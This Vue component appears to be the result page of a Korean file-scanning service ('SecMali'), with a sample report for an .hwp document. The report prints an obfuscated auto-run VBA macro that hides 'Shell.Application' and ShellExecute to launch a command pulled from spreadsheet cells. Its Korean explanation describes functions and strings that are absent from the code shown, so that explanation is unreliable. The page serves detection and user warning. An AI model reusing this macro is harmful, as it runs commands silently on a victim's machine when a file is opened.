<template>
  <q-page id="sub">
    <div ref="wrapElement" class="wrap">
      <div class="wrap-inner">
        <div class="wrap-title flex-container flex flex-center">
          <q-btn dense color="blue" round icon="email" class="q-ml-md img">
            <q-badge color="red" floating>1</q-badge>
          </q-btn>
          <div class="text-h4 q-mb-md font3">
            <p class="color title font3"><b>파일 분석 완료!</b></p>
          </div>
        </div>
        <div>
          <div class="fixed-botton-center down-container">
            <q-btn
              @click="addScrolledClass"
              text-color="white"
              flat
              class="sd text-lowercase"
              >Scroll Down</q-btn
            >
            <div></div>
          </div>
        </div>
      </div>
    </div>

    <div ref="contentElement" class="content clearfix">
      <div class="flex flex-center con-container">
        <div class="box">
          <div
            class="text-center preview-description fixed-top-center"
            style="background-color: #e8eaf6"
          >
            <h1 style="background-color: #e8eaf6">SecMali REPORT</h1>
          </div>
          <div class="title1" style="background-color: #e8eaf6">
            <p
              class="text-h5 q-mb-md font"
              style="font-weight: bold; background-color: #e8eaf6"
            >
              RE: secmali 예시 파일.hwp
            </p>
            <p
              class="text-h6 q-mb-md font"
              style="font-weight: 400; background-color: #e8eaf6"
            >
              보낸사람 secmali@secure.com
            </p>
          </div>
          <hr style="border: solid 1.5px black" />
          <div class="analysis" style="background-color: #e8eaf6">
            <div
              class="text-h6 q-mb-md font analysis-t"
              style="font-weight: bold; background-color: #e8eaf6"
            >
              발견된 위협
            </div>
            <div
              class="text-body2 q-my-md font analysis-c"
              style="font-weight: 400; background-color: #e8eaf6"
            >
              파일명 : secmali 예시 파일.hwp<br />1. 매크로 발견<br />2.
              의심스러운 실행 파일 발견
            </div>
            <div
              class="text-h6 q-mb-md font analysis-t"
              style="font-weight: bold; background-color: #e8eaf6"
            >
              매크로 코드
            </div>
            <div
              class="text-body2 q-my-md font2 analysis-c"
              style="font-weight: 400; background-color: #e8eaf6"
            >
              Private Sub Workbook_Open()<br />Dim g5 As String<br />Dim g6 As
              String<br /><br />g5 = ""<br />g6 = ""<br /><br />g5 = Cells(2, 7)
              // $g$2<br />g6 = Cells(3, 7) // $g$3<br /><br />lyDdMyWVp =
              wJmdrV(g5, g6)<br /><br />End Sub<br /><br />Function wJmdrV(eeeew
              As String, ifgkdfg As String)<br /><br />Dim DGjG() As Variant<br />
              ReDim DGjG(4)<br />
              DGjG(0) = "p" + ifgkdfg<br />
              DGjG(1) = "ping google.com;" + eeeew<br />
              DGjG(2) = ""<br />
              DGjG(3) = ""<br />
              DGjG(4) = 0<br />Dim sSVno As Object<br /><br />Set sSVno =
              CreateObject(invuKAT())<br /><br />zsEd = CallByName(sSVno,
              RijxuydD(" S h e l l E x e c u t e "), VbMethod, DGjG(0), DGjG(1),
              DGjG(2), DGjG(3), DGjG(4))<br /><br />End Function<br /><br />Function
              invuKAT()<br />invuKAT = RijxuydD("S h e l l . A p p l i c a t i o
              n")<br />End Function<br /><br />Function RijxuydD(wjkwer)<br />newStr
              = ""<br />For i = 1 To Len(wjkwer)<br />
              char = Mid(wjkwer, i, 1)<br />
              If (char &lt;&gt; " ") Then<br />
              newStr = newStr + Mid(wjkwer, i, 1)<br />
              End If<br />Next<br />RijxuydD = newStr<br />End Function
            </div>
            <div
              class="text-h6 q-mb-md font analysis-t"
              style="font-weight: bold; background-color: #e8eaf6"
            >
              매크로 분석 결과
            </div>
            <div
              class="text-body2 q-my-md font analysis-c"
              style="font-weight: 400; background-color: #e8eaf6"
            >
              이 코드는 Microsoft Word 문서를 열 때 특정 동작을 수행하는 VBA
              (Visual Basic for Applications) 코드입니다.<br /><br />Document_Open()은
              문서가 열릴 때 실행되는 매크로입니다. 이 함수 내에서는 세 가지
              함수인 asfwefsadfasfsadf(), asfwqfasfsdafas(), eifhhdfasfiedf()를
              호출합니다.<br /><br />asfwefsadfasfsadf() 함수는 현재 선택된
              문자를 삭제합니다.<br /><br />asfwqfasfsdafas() 함수는 전체 문서를
              선택하고, 선택된 텍스트의 글꼴을 숨깁니다.<br /><br />eifhhdfasfiedf()
              함수는 가장 복잡한 부분으로, Shell.Application 객체를 생성하고,
              특정 스크립트를 실행합니다. 이 스크립트는 웹에서 파일을
              다운로드하고 실행하는 것으로 보입니다. 그러나 “tuwhn” 문자열을
              제거하면 실제 URL과 스크립트 내용을 확인할 수 있습니다.<br /><br />이
              코드는 사용자의 동의 없이 파일을 다운로드하고 실행하므로, 보안상
              위험할 수 있습니다. 항상 신뢰할 수 있는 소스에서 코드를 가져오고,
              코드가 무엇을 하는지 이해하기 전에는 실행하지 않는 것이 좋습니다.
            </div>
          </div>
        </div>
        <div class="btn-con">
          <q-btn
            onclick="location.href='#'"
            class="btn"
            text-color="white"
            style="font-weight: bold"
            label="파일 더 분석하기"
          />
        </div>
      </div>
    </div>
  </q-page>
</template>

<script>
import { defineComponent, ref, onMounted, onUnmounted } from "vue";

export default defineComponent({
  name: "ResultPage",
  setup() {
    const wrapElement = ref(null);
    const contentElement = ref(null);

    function addScrolledClass() {
      wrapElement.value.classList.add('scrolled');
      contentElement.value.classList.add('scrolled');

      console.log(wrapElement.value.classList, contentElement.value.classList);
    }

    function handleMouseWheelWrap(e) {
      if (e.deltaY > 0) {
        wrapElement.value.classList.add("scrolled");
        contentElement.value.classList.add('scrolled');
        e.preventDefault();
        return false;
      }
    };

    function handleMouseWheelWindow(e) {
      if (wrapElement.value.classList.contains("scrolled")) {
        if (window.scrollY === 0 && e.deltaY < 0) {
          wrapElement.value.classList.remove("scrolled");
          contentElement.value.classList.remove("scrolled");
        }
      }
    };

    onMounted(() => {
      wrapElement.value.addEventListener("wheel", handleMouseWheelWrap);
      window.addEventListener("wheel", handleMouseWheelWindow);
    });

    onUnmounted(() => {
      wrapElement.value.removeEventListener("wheel", handleMouseWheelWrap);
      contentElement.value.removeEventListener("wheel", handleMouseWheelWrap);
      window.removeEventListener("wheel", handleMouseWheelWindow);
    });

    return {
      addScrolledClass,
      wrapElement,
      contentElement
    };
  },
});
</script>

<style scoped>
* {
  background-color: #383f6d;
}

.color {
  color: white;
  padding-top: 35px;
}

.img {
  margin-right: 20px;
}

.font3 {
  font-family: "Nanum Myeongjo";
}

.flex-container {
  width: 100%;
  height: 750px;
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: flex;

  -webkit-box-align: center;
  -moz-box-align: center;
  -ms-flex-align: center;
  align-items: center; /* 수직 정렬 */

  -webkit-box-pack: center;
  -moz-box-pack: center;
  -ms-flex-pack: center;
  justify-content: center; /* 수평 정렬 */
}

.con-container {
  margin-top: 50px;
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: flex;

  -webkit-box-align: center;
  -moz-box-align: center;
  -ms-flex-align: center;
  align-items: center; /* 수직 정렬 */

  -webkit-box-pack: center;
  -moz-box-pack: center;
  -ms-flex-pack: center;
  justify-content: center; /* 수평 정렬 */

  flex-direction: column;
}

.wrap {
  position: fixed;
  z-index: 9;
  transition: all 1.6s cubic-bezier(0.86, 0, 0.07, 1);
}

.wrap.scrolled {
  transform: translate3d(0, -100%, 0) scale(0.75);
  opacity: 0;
}

.wrap-inner {
  display: table;
  width: 100%;
  height: 100vh;
  position: fixed;
  top: 0;
}

.title {
  letter-spacing: 0.1em;
  text-transform: uppercase;
}

a {
  text-decoration-line: none;
}
.wrap-title {
  display: table-cell;
  vertical-align: middle;
  text-align: center;
}

.wrap {
  overflow: hidden;
  z-index: 1;
}
.down-container {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: flex;

  -webkit-box-align: center;
  -moz-box-align: center;
  -ms-flex-align: center;
  align-items: center; /* 수직 정렬 */

  -webkit-box-pack: center;
  -moz-box-pack: center;
  -ms-flex-pack: center;
  justify-content: center; /* 수평 정렬 */

  flex-direction: column;
}

.content {
  position: relative;
  background-color: #fff;
  border-top: 10px solid black;
  padding: 0;
  margin: 0;
  transition: all 1.6s cubic-bezier(0.86, 0, 0.07, 1);
  transform: translate3d(0, 20px, 0) scale(0.75);
  opacity: 0;
}
.content.scrolled {
  transform: translate3d(0, 0, 0) scale(1);
  opacity: 1;
}
.sc-text {
  color: white;
  font-weight: bozz;
}

.preview-description h1 {
  margin: 10px;
  -webkit-text-fill-color: #383f6d;
  -webkit-text-stroke: 6px #383f6d;
  font-size: 55px;
  font-family: "Oxygen", sans-serif;
  text-transform: uppercase;
  letter-spacing: -3px;
  margin-bottom: 50px;
}

.sd {
  position: absolute;
  bottom: 20px;
  left: 50%;
  transform: translateX(-50%);
}

.sd:hover,
.sd:focus {
  opacity: 0.7;
  text-decoration: none;
}
.box {
  outline: black 1px solid;
  height: max-content;
  width: 90%;
  margin: 20px;
  padding: 30px;
  background-color: #e8eaf6;
}

.title1 {
  padding-left: 20px;
  padding-right: 20px;
  padding-top: 20px;
}
.analysis-t {
  padding-left: 20px;
  padding-right: 20px;
  padding-top: 20px;
}

.img {
  margin-right: 20px;
}
.analysis-c {
  padding-left: 30px;
  padding-right: 30px;
  padding-top: 10px;
}

.btn {
  border-radius: 20px;
  margin-top: 20px;
  margin-bottom: 50px;
}

.font {
  font-family: "Noto Sans KR", "sans-serif";
}

.font2 {
  font-family: "IBM Plex Mono";
}

.font3 {
  font-family: "Nanum Myeongjo";
}

.wrap {
  overflow: hidden;
  z-index: 1;
}
</style>
